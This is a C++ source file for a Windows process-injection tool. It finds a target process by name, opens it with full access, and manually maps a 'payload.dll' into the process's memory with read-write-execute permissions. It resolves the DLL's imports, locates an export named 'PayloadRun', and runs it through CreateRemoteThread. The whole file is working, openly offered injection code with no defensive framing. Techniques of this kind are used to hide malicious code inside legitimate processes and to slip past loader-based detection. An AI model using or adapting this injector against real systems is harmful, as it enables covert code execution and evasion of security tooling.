#include <shared/stdafx.hxx>

#include <tlhelp32.h>

//
// Find the PID of the first process matching a given name
//
static DWORD FindPid( const char* Name ) {
  SafeHandle Snapshot( CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 ) );

  if ( Snapshot.Handle == INVALID_HANDLE_VALUE ) {
    return 0;
  }

  PROCESSENTRY32 Entry{};
  Entry.dwSize = sizeof( Entry );

  if ( !Process32First( Snapshot, &Entry ) ) {
    return 0;
  }

  do {
    if ( _stricmp( Entry.szExeFile, Name ) == 0 ) {
      return Entry.th32ProcessID;
    }
  } while ( Process32Next( Snapshot, &Entry ) );

  return 0;
}

struct MapResult {
  BYTE* RemoteBase = nullptr;
  DWORD ExportRva = 0;
};

static MapResult ManualMap( HANDLE Process, const char* DllPath ) {
  MapResult Result{};

  //
  // Read the raw PE from disk
  //
  SafeHandle File( CreateFileA(
    DllPath,
    GENERIC_READ,
    FILE_SHARE_READ,
    nullptr,
    OPEN_EXISTING,
    0,
    nullptr
  ) );

  if ( File.Handle == INVALID_HANDLE_VALUE ) {
    LOG_ERROR( "CreateFileA failed: {}", GetLastError() );
    return Result;
  }

  DWORD FileSize = GetFileSize( File, nullptr );
  std::vector<BYTE> Raw( FileSize );
  DWORD BytesRead = 0;

  ReadFile( File, Raw.data(), FileSize, &BytesRead, nullptr );

  //
  // Validate PE signatures
  //
  auto* Dos = reinterpret_cast<IMAGE_DOS_HEADER*>( Raw.data() );

  if ( Dos->e_magic != IMAGE_DOS_SIGNATURE ) {
    LOG_ERROR( "Invalid DOS signature" );
    return Result;
  }

  auto* Nt = reinterpret_cast<IMAGE_NT_HEADERS*>( Raw.data() + Dos->e_lfanew );

  if ( Nt->Signature != IMAGE_NT_SIGNATURE ) {
    LOG_ERROR( "Invalid NT signature" );
    return Result;
  }

  //
  // Allocate space for the full image in the target process
  //
  auto* Remote = reinterpret_cast<BYTE*>( VirtualAllocEx(
    Process,
    nullptr,
    Nt->OptionalHeader.SizeOfImage,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
  ) );

  if ( !Remote ) {
    LOG_ERROR( "VirtualAllocEx failed: {}", GetLastError() );
    return Result;
  }

  LOG_INFO( "Remote allocation: {:#018x} ({} bytes)",
    reinterpret_cast<std::uintptr_t>( Remote ),
    Nt->OptionalHeader.SizeOfImage
  );

  //
  // Build the in-memory image locally before copying it over
  //
  std::vector<BYTE> Image( Nt->OptionalHeader.SizeOfImage, 0 );

  // PE headers
  std::memcpy( Image.data(), Raw.data(), Nt->OptionalHeader.SizeOfHeaders );

  // Sections
  auto* Section = IMAGE_FIRST_SECTION( Nt );

  for ( WORD I = 0; I < Nt->FileHeader.NumberOfSections; ++I, ++Section ) {
    if ( Section->SizeOfRawData && Section->PointerToRawData ) {
      std::memcpy(
        Image.data() + Section->VirtualAddress,
        Raw.data() + Section->PointerToRawData,
        Section->SizeOfRawData
      );
    }
  }

  //
  // Apply base relocations if we didn't land at the preferred base
  //
  auto Delta = reinterpret_cast<std::intptr_t>( Remote )
             - static_cast<std::intptr_t>( Nt->OptionalHeader.ImageBase );

  if ( Delta ) {
    auto& Dir = Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

    if ( Dir.VirtualAddress && Dir.Size ) {
      auto* Block = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
        Image.data() + Dir.VirtualAddress
      );

      auto* End = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
        Image.data() + Dir.VirtualAddress + Dir.Size
      );

      while ( Block < End && Block->SizeOfBlock > 0 ) {
        DWORD Count = ( Block->SizeOfBlock - sizeof( IMAGE_BASE_RELOCATION ) ) / sizeof( WORD );
        auto* Entries = reinterpret_cast<WORD*>( Block + 1 );

        for ( DWORD J = 0; J < Count; ++J ) {
          if ( ( Entries[ J ] >> 12 ) == IMAGE_REL_BASED_DIR64 ) {
            auto* Patch = reinterpret_cast<std::intptr_t*>(
              Image.data() + Block->VirtualAddress + ( Entries[ J ] & 0x0FFF )
            );

            *Patch += Delta;
          }
        }

        Block = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
          reinterpret_cast<BYTE*>( Block ) + Block->SizeOfBlock
        );
      }
    }
  }

  //
  // Resolve imports by looking up functions in our own process.
  // System DLLs (kernel32, ntdll, etc.) are loaded at the same base
  // address across all processes in a session, so the pointers we
  // write into the IAT are valid in the target process too.
  // This only works for system DLLs that share a base across processes.
  // Non-system DLLs or DLLs not loaded in the target will produce bad pointers.
  //
  auto& ImportDir = Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];

  if ( ImportDir.VirtualAddress && ImportDir.Size ) {
    auto* Desc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
      Image.data() + ImportDir.VirtualAddress
    );

    for ( ; Desc->Name; ++Desc ) {
      auto* DllName = reinterpret_cast<char*>( Image.data() + Desc->Name );

      HMODULE Dll = LoadLibraryA( DllName );

      if ( !Dll ) {
        LOG_ERROR( "LoadLibraryA({}) failed: {}", DllName, GetLastError() );
        continue;
      }

      LOG_INFO( "Resolving imports from {} ({:#018x})",
        DllName, reinterpret_cast<std::uintptr_t>( Dll )
      );

      // Prefer OriginalFirstThunk when present
      DWORD OrigRva = Desc->OriginalFirstThunk
                    ? Desc->OriginalFirstThunk
                    : Desc->FirstThunk;

      auto* Orig = reinterpret_cast<IMAGE_THUNK_DATA*>( Image.data() + OrigRva );
      auto* Thunk = reinterpret_cast<IMAGE_THUNK_DATA*>( Image.data() + Desc->FirstThunk );

      for ( ; Orig->u1.AddressOfData; ++Orig, ++Thunk ) {
        FARPROC Fn = nullptr;

        if ( IMAGE_SNAP_BY_ORDINAL( Orig->u1.Ordinal ) ) {
          Fn = GetProcAddress( Dll, MAKEINTRESOURCEA( IMAGE_ORDINAL( Orig->u1.Ordinal ) ) );
        } else {
          auto* Ibn = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
            Image.data() + static_cast<std::size_t>( Orig->u1.AddressOfData & 0xFFFF'FFFFull )
          );

          Fn = GetProcAddress( Dll, Ibn->Name );

          if ( !Fn ) {
            LOG_ERROR( "Missing import: {}", Ibn->Name );
          }
        }

        Thunk->u1.Function = reinterpret_cast<ULONGLONG>( Fn );
      }
    }
  }

  //
  // Find the PayloadRun export in the images export table
  //
  auto& ExportDir = Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

  if ( ExportDir.VirtualAddress && ExportDir.Size ) {
    auto* Exp = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
      Image.data() + ExportDir.VirtualAddress
    );

    auto* Names = reinterpret_cast<DWORD*>( Image.data() + Exp->AddressOfNames );
    auto* Ordinals = reinterpret_cast<WORD*>( Image.data() + Exp->AddressOfNameOrdinals );
    auto* Functions = reinterpret_cast<DWORD*>( Image.data() + Exp->AddressOfFunctions );

    for ( DWORD I = 0; I < Exp->NumberOfNames; ++I ) {
      auto* Sym = reinterpret_cast<char*>( Image.data() + Names[ I ] );

      if ( std::strcmp( Sym, "PayloadRun" ) == 0 ) {
        Result.ExportRva = Functions[ Ordinals[ I ] ];
        LOG_INFO( "PayloadRun RVA: {:#010x}", Result.ExportRva );
        break;
      }
    }
  }

  if ( !Result.ExportRva ) {
    LOG_ERROR( "Export PayloadRun not found" );
    VirtualFreeEx( Process, Remote, 0, MEM_RELEASE );
    return Result;
  }

  //
  // Write the fully fixed-up image into the target!
  //
  SIZE_T Written = 0;

  if ( !WriteProcessMemory( Process, Remote, Image.data(), Image.size(), &Written ) ) {
    LOG_ERROR( "WriteProcessMemory failed: {}", GetLastError() );
    VirtualFreeEx( Process, Remote, 0, MEM_RELEASE );
    Result.ExportRva = 0;

    return Result;
  }

  LOG_OK( "Wrote {} bytes to target", Written );

  Result.RemoteBase = Remote;

  return Result;
}

int main( int Argc, char** Argv ) {
  const char* TargetName = Argc > 1 ? Argv[ 1 ] : "host.exe";
  const char* PayloadPath = Argc > 2 ? Argv[ 2 ] : "payload.dll";

  LOG_STEP( "Looking for {}", TargetName );

  DWORD Pid = FindPid( TargetName );

  if ( !Pid ) {
    LOG_ERROR( "Process not found" );
    return 1;
  }

  LOG_OK( "Found {} with PID {}", TargetName, Pid );

  SafeHandle Process( OpenProcess( PROCESS_ALL_ACCESS, FALSE, Pid ) );

  if ( !Process ) {
    LOG_ERROR( "OpenProcess failed: {}", GetLastError() );
    return 1;
  }

  LOG_STEP( "Manual-mapping {}", PayloadPath );

  auto [ RemoteBase, ExportRva ] = ManualMap( Process, PayloadPath );

  if ( !RemoteBase ) {
    return 1;
  }

  auto* Entry = RemoteBase + ExportRva;

  LOG_STEP( "Creating remote thread at {:#018x}",
    reinterpret_cast<std::uintptr_t>( Entry )
  );

  SafeHandle Thread( CreateRemoteThread(
    Process, nullptr, 0,
    reinterpret_cast<LPTHREAD_START_ROUTINE>( Entry ),
    nullptr, 0, nullptr
  ) );

  if ( !Thread ) {
    LOG_ERROR( "CreateRemoteThread failed: {}", GetLastError() );
    return 1;
  }

  LOG_OK( "Thread created, waiting for completion" );

  WaitForSingleObject( Thread, 10'000 );

  LOG_OK( "Done" );

  return 0;
}
